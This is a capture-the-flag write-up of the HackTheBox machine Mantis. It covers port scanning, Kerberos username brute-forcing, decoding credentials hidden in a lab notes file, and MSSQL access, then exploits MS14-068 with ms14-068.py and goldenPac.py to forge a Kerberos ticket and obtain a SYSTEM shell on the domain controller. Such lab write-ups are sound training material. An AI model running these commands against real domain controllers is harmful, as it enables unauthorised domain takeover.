---
title: HTB: Mantis
url: https://0xdf.gitlab.io/2020/09/03/htb-mantis.html
date: 2020-09-03T09:00:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-mantis, ctf, hackthebox, nmap, smbmap, smbclient, rcpclient, kerbrute, orchard-cms, gobuster, mssql, mssqlclient, dbeaver, crackmapexec, ms14-068, kerberos, kinit, golden-ticket, goldenpac
---

![Mantis](https://0xdfimages.gitlab.io/img/mantis-cover.png)

Mantis was one of those Windows targets where it’s just a ton of enumeration until you get a System shell. The only exploit on the box was something I remember reading about years ago, where a low level user was allowed to make a privileged Kerberos ticket. To get there, I’ll have to avoid a few rabbit holes and eventually find creds for the SQL Server instance hidden on a webpage. The database has domain credentials for a user. I’ll use those to perform the attack, which will return SYSTEM access.

## Box Info

| Name | [Mantis](https://hackthebox.com/machines/mantis)  [Mantis](https://hackthebox.com/machines/mantis) [Play on HackTheBox](https://hackthebox.com/machines/mantis) |
| --- | --- |
| Release Date | [16 Sep 2017](https://twitter.com/hackthebox_eu/status/908326270806753280) |
| Retire Date | 24 Feb 2018 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Mantis |
| Radar Graph | Radar chart for Mantis |
| First Blood User | 14:06:13[echthros echthros](https://app.hackthebox.com/users/2846) |
| First Blood Root | 14:06:48[echthros echthros](https://app.hackthebox.com/users/2846) |
| Creator | [lkys37en lkys37en](https://app.hackthebox.com/users/709) |

## Recon

### nmap

`nmap` found a ton of open TCP ports:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.52
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-29 07:00 EDT
Warning: 10.10.10.52 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.52
Host is up (0.013s latency).
Not shown: 65507 closed ports
PORT      STATE    SERVICE
53/tcp    open     domain
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
1337/tcp  open     waste
1433/tcp  open     ms-sql-s
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5722/tcp  open     msdfsr
8080/tcp  open     http-proxy
9389/tcp  open     adws
10475/tcp filtered unknown
26347/tcp filtered unknown
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49157/tcp open     unknown
49158/tcp open     unknown
49164/tcp open     unknown
49165/tcp open     unknown
49171/tcp open     unknown
50255/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds

root@kali# nmap -p 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,10475,26347,49152,49153,49154,49155,49157,49158,49164,49165,49171,50255 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.52                                                                                                                     
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-29 07:02 EDT
Nmap scan report for 10.10.10.52
Host is up (0.015s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open   tcpwrapped
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open   tcpwrapped
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
1337/tcp  open   http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open   ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-08-29T11:00:57
|_Not valid after:  2050-08-29T11:00:57
|_ssl-date: 2020-08-29T11:05:29+00:00; +1m46s from scanner time.
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5722/tcp  open   msrpc        Microsoft Windows RPC
8080/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open   mc-nmf       .NET Message Framing
10475/tcp closed unknown
26347/tcp closed unknown
49152/tcp open   msrpc        Microsoft Windows RPC
49153/tcp open   msrpc        Microsoft Windows RPC
49154/tcp open   msrpc        Microsoft Windows RPC
49155/tcp open   msrpc        Microsoft Windows RPC
49157/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc        Microsoft Windows RPC
49164/tcp open   msrpc        Microsoft Windows RPC
49165/tcp open   msrpc        Microsoft Windows RPC
49171/tcp open   msrpc        Microsoft Windows RPC
50255/tcp open   ms-sql-s     Microsoft SQL Server 2014 12.00.2000
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-08-29T11:00:57
|_Not valid after:  2050-08-29T11:00:57
|_ssl-date: 2020-08-29T11:05:29+00:00; +1m46s from scanner time.
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 36m02s, deviation: 1h30m43s, median: 1m45s
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2020-08-29T07:05:20-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-08-29T11:05:24
|_  start_date: 2020-08-29T11:00:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.72 seconds

```

`nmap` identifies the host OS as Windows Server 2008 R2 Standard 7601 Service Pack 1. A bunch of those ports looks like a standard Windows Domain controller, but there are others of interest as well, like HTTP on 1337 and 8080 and MSSQL on 1433. `nmap` identifies the domain name as `htb.local`.

### SMB - TCP 445

Both `smbmap` and `smbclient` seem to authenticate anonymously, but return no shares:

```

root@kali# smbmap -H 10.10.10.52
[+] IP: 10.10.10.52:445 Name: 10.10.10.52                                       

root@kali# smbclient -N -L //10.10.10.52
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

```

### RPC - TCP 445

I tried connecting with `rpcclient`, and was able to connect, but then any query I ran returned access denied:

```

root@kali# rpcclient -U '' -N 10.10.10.52
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED

```

### Kerberos - TCP 88

With Kerberos open, many active directory attacks are available. With nothing but the domain name, I can brute for usernames with [Kerbrute](https://github.com/ropnop/kerbrute):

```

root@kali# kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/30/20 - Ronnie Flathers @ropnop

2020/08/30 08:36:16 >  Using KDC(s):
2020/08/30 08:36:16 >   10.10.10.52:88

2020/08/30 08:36:16 >  [+] VALID USERNAME:       james@htb.local
2020/08/30 08:36:17 >  [+] VALID USERNAME:       James@htb.local
2020/08/30 08:36:19 >  [+] VALID USERNAME:       administrator@htb.local
2020/08/30 08:36:22 >  [+] VALID USERNAME:       mantis@htb.local
2020/08/30 08:36:26 >  [+] VALID USERNAME:       JAMES@htb.local
2020/08/30 08:36:36 >  [+] VALID USERNAME:       Administrator@htb.local
2020/08/30 08:36:45 >  [+] VALID USERNAME:       Mantis@htb.local

```

Now with three usersnames, I can check those users for ASP-Roasting with `GetNPUser`, but none are susceptible:

```

root@kali# for user in $(cat users); do GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.10.10.52 2>/dev/null | grep -F -e '[+]' -e '[-]'; done
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mantis doesn't have UF_DONT_REQUIRE_PREAUTH set

```

### Website - TCP 8080

#### Site

The site is a blog titled Tossed Salad:

![image-20200829070937747](https://0xdfimages.gitlab.io/img/image-20200829070937747.png)

The first post looks like the initial post for an [Orchard CMS](http://www.orchardcore.net/) instance. I tried guessing a few pages (like `/README.md`) and got a 404 page that had a link to “Sign In”, which led to `http://10.10.10.52:8080/Users/Account/LogOn?ReturnUrl=%2FREADME.md`:

![image-20200831065014885](https://0xdfimages.gitlab.io/img/image-20200831065014885.png)

I tried a few command usernames / passwords, but didn’t make any progress.

#### Vulnerabilities

`searchspolit` doesn’t find any vulnerabilities in this CMS. At first I thought this might be something, but Orchid VMS (Video Management System) is not the same as CMS (Content Management System):

```

root@kali# searchsploit orchid
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
IPConfigure Orchid VMS 2.0.5 - Directory Traversal / Information Discl | multiple/webapps/44916.rb
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

I suspect that if I can log in, I can find some way to upload something that will execute (true for most CMS), but that’s it for now.

#### Directory Brute Force

I’m often hesitant to brute force against a CMS, but I started run `gobuster` against the site to see if anything interesting pops out. It takes forever, and returns a ton of stuff, and then dies on me. I didn’t see anything interesting in the results, and moved on.

### Website - TCP 1337

#### Site

Any time there’s a port 1337 in a CTF, it’s worth spending extra time on it. The site is just an IIS default starting image:

![image-20200902085439005](https://0xdfimages.gitlab.io/img/image-20200902085439005.png)

#### Directory Brute Force

`gobuster` finds a single interesting directory:

```

root@kali# gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -o scans/gobuster-1337-medium 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.52:1337
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/30 08:52:52 Starting gobuster
===============================================================
/secure_notes (Status: 301)
===============================================================
2020/08/30 08:55:11 Finished
===============================================================

```

#### /secure\_notes

The `/secure_notes/` directory is listable, containing two files:

![image-20200902090330670](https://0xdfimages.gitlab.io/img/image-20200902090330670.png)

The `web.config` file returns 404, but the dev notes file loads:

[![secure_notes](https://0xdfimages.gitlab.io/img/image-20200902090944485.png)](https://0xdfimages.gitlab.io/img/image-20200902090944485.png)

[![secure_notes](https://0xdfimages.gitlab.io/img/image-20200902090944485-bottom.png)](https://0xdfimages.gitlab.io/img/image-20200902090944485.png)
*Click for full image*

There’s a ton of whitespace between the top note and the stuff at the bottom. There’s two bits about credentials:
- The OrchardCMS creds with a long binary string
- SQL Server sa creds “file namez”

I’ll use some Bash tricks and Perl to decode the binary to ASCII for the OrchardCMS creds:

```

root@kali# perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )
@dm!n_P@ssW0rd!

```

I was able to login `http://10.10.10.52:8080/admin` using the creds `admin` / `@dm!n_P@ssW0rd!`. I actually played with the Orchard Admin panel for a while, but surprisingly wasn’t able to get RCE from it.

For SQL Server, the notes is about the file name, nad this one has some base64 inside of it, `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`. That decodes to a string of hex:

```

root@kali# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
6d2424716c5f53405f504073735730726421

```

All of the two digit hex values seem to fall into the ASCII range, so I’ll give that a try with `xxd`, and it works:

```

root@kali# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
m$$ql_S@_P@ssW0rd!

```

### MSSQL - TCP 1433

I tried to connect as the user `sa`, but it didn’t work:

```

root@kali# mssqlclient.py 'sa:m$$ql_S@_P@ssW0rd!@10.10.10.52'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'sa'.  

```

Given that the user for Orchard was `admin`, I’ll try that here, and it works:

```

root@kali# mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 

```

I started with `mssqlclient.py`, but the database was large, and I decided to switch to a GUI, `dbeaver`. On starting it, there’s a pop-up to connect to a database:

![image-20200902153202692](https://0xdfimages.gitlab.io/img/image-20200902153202692.png)

I selected SQL Server, and filled in the next form:

![image-20200902153735457](https://0xdfimages.gitlab.io/img/image-20200902153735457.png)

I hit the Test Connection button and, after downloading a driver, it reported that it connected successfully. I hit Finish.

Now the Database shows four databases:

![image-20200902154202286](https://0xdfimages.gitlab.io/img/image-20200902154202286.png)

After digging around, I found the `blog_Orchard_Users_UserPartRecord` table under orcharddb/Schemas/dbo/Tables:

[![](https://0xdfimages.gitlab.io/img/image-20200902155559104.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200902155559104.png)

The admin one probably lines up with the password from above, but I don’t have the number of rounds used for PBKDF2 (typically that’d be stored as part of the hash), so I won’t bother verifying that for now. Much more interesting is James, who’s password is stored as plaintext and who’s email is `james@htb.local`.

## Recon as James

Now that I have a Windows credential, there is potentially a lot more to check as far as enumeration. (None of it ended being necessary, but I’ll quickly show it.)

### SMB - TCP 445

CrackMapExec shows that the creds are valid:

```

root@kali# crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 

```

Since it doesn’t say `(Pwned!)`, I can’t likely get execution through SMB.

I can see two shares now:

```

root@kali# smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
[+] IP: 10.10.10.52:445 Name: 10.10.10.52                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 

```

I poked around in both, but didn’t find much.

### RPC - TCP 445

james can connect to RPC and list users:

```

root@kali# rpcclient -U htb.local/james 10.10.10.52
Enter HTB.LOCAL\james's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[james] rid:[0x44f]

```

Nothing too exciting here.

### Kerberos

With a user, now I can dump the full list of ASP-REP vulnerable users, but there aren’t any:

```

root@kali# GetNPUsers.py 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

No entries found!

```

## Shell as System

### Identify Exploit

After striking out on more exploitation, I started to Google a bit, and eventually found [this blog post](https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html) about MS14-068. Basically it’s a critical vulnerability in Windows DCs that allow a simple user to get a Golden ticket without being an admin. With that ticket, I am basically a domain admin.

### Prep My VM

Following along with the article, I’ll install the Kerberos packages:

```

root@kali# apt-get install krb5-user cifs-utils

```

I’ll add the domain controller to my `/etc/hosts` file using the name identified by `nmap` at the start:

```
10.10.10.52 mantis.htb.local mantis

```

and add Mantis as a DNS server in `/etc/resolv.conf`:

```

nameserver 10.10.10.52
nameserver 1.1.1.1
nameserver 1.0.0.1

```

`/etc/krb5.conf` needs to have information about the domain. Based on the blog, I’ll set mine to:

```

[libdefaults]
    default_realm = HTB.LOCAL

[realms]
    htb.local = {
        kdc = mantis.htb.local:88
        admin_serve = mantis.htb.local
        default_domain = htb.local
    }
[domain_realm]
    .domain.internal = htb.local
    domain.internal = htb.local

```

I’ll use `ntpdate 10.10.10.52` to sync my host’s time to Mantis, as Kerberos requires the two clocks be in sync.

### Generate Kerberos Ticket

First I’ll test this config and try to generate a Kerberos ticket:

```

root@kali# kinit james
Password for james@HTB.LOCAL: 

```

`klist` will show the ticket:

```

root@kali# klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: james@HTB.LOCAL

Valid starting       Expires              Service principal
08/30/2020 16:44:33  08/31/2020 02:44:33  krbtgt/HTB.LOCAL@HTB.LOCAL
        renew until 08/31/2020 16:44:26

```

I can try to connect to `C$`, and it will fail:

```

root@kali# smbclient -W htb.local //mantis/c$ -k
tree connect failed: NT_STATUS_ACCESS_DENIED

```

That makes sense, since this ticket is for james. If I try to connect to `SYSVOL`, it works:

```

root@kali# smbclient -W htb.local //mantis/sysvol -k
Try "help" to get a list of possible commands.
smb: \>

```

### Forge Golden Ticket

First I need the SID for the james user. I’ll get it via `rpcclient`:

```

rpcclient $> lookupnames james
james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)

```

I was able to find a copy of `ms14-068.py` [here](https://github.com/mubix/pykek), and I’ll run it just like the help suggests:

```

root@kali# python /opt/pykek/ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
Password: 
  [+] Building AS-REQ for mantis.htb.local... Done!
  [+] Sending AS-REQ to mantis.htb.local... Done!
  [+] Receiving AS-REP from mantis.htb.local... Done!
  [+] Parsing AS-REP from mantis.htb.local... Done!
  [+] Building TGS-REQ for mantis.htb.local... Done!
  [+] Sending TGS-REQ to mantis.htb.local... Done!
  [+] Receiving TGS-REP from mantis.htb.local... Done!
  [+] Parsing TGS-REP from mantis.htb.local... Done!
  [+] Creating ccache file 'TGT_james@htb.local.ccache'... Done!

```

This creates a file, `TGT_james@htb.local.ccache`. I’ll copy this into `/tmp` where it is used:

```

root@kali# cp TGT_james@htb.local.ccache /tmp/krb5cc_0

```

### Filesystem Access

Now I have access to the entire filesystem:

```

root@kali# smbclient -W htb.local //mantis/c$ -k
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Fri Sep  1 10:19:03 2017
  Documents and Settings            DHS        0  Tue Jul 14 01:06:44 2009
  inetpub                             D        0  Fri Sep  1 09:41:09 2017
  pagefile.sys                      AHS 2146951168  Wed Sep  2 16:33:23 2020
  PerfLogs                            D        0  Mon Jul 13 23:20:08 2009
  Program Files                      DR        0  Sat Dec 23 22:28:26 2017
  Program Files (x86)                DR        0  Fri Sep  1 14:28:51 2017
  ProgramData                        DH        0  Fri Sep  1 09:16:24 2017
  Recovery                          DHS        0  Fri Sep  1 01:39:12 2017
  System Volume Information         DHS        0  Thu Aug 31 20:02:33 2017
  Users                              DR        0  Fri Sep  1 10:19:01 2017
  Windows                             D        0  Sat Dec 23 22:31:49 2017

                5480959 blocks of size 4096. 288821 blocks available

```

I can grab both flags:

```

smb: \> get Users\james\desktop\user.txt
getting file \Users\james\desktop\user.txt of size 32 as Users\james\desktop\user.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

smb: \> get Users\administrator\desktop\root.txt
getting file \Users\administrator\desktop\root.txt of size 32 as Users\administrator\desktop\root.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

```

### Shell

Impacket has a script, `goldenPac.py` which will do all of this and return a shell:

```

root@kali# goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file IGiaSrqf.exe
[*] Opening SVCManager on mantis.....
[*] Creating service jAFc on mantis.....
[*] Starting service jAFc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```